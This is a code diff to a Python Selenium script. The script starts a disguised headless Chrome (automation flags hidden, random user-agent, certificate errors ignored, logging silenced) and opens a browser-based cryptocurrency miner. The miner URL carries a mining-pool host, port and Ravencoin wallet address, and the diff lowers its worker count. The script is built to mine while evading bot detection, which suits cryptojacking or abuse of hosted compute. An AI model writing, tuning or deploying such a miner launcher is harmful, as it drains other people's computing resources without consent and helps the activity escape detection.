@@ -28,7 +28,6 @@ chrome_options.add_argument("--disable-popup-blocking")
 chrome_options.add_argument("--ignore-certificate-errors")
 chrome_options.add_argument("--disable-logging")
 chrome_options.add_argument("--log-level=3")
-chrome_options.add_argument("--output=/dev/null")
 chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 125)}.0.0.0 Safari/537.36")
 chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
 chrome_options.add_experimental_option("useAutomationExtension", False)
@@ -59,7 +58,7 @@ try:
         time.sleep(random.uniform(min, max))
     
     # Navigate to URL with random query parameters
-    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=96"
+    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=48"
     driver.get(base_url)
     human_like_delay()
 
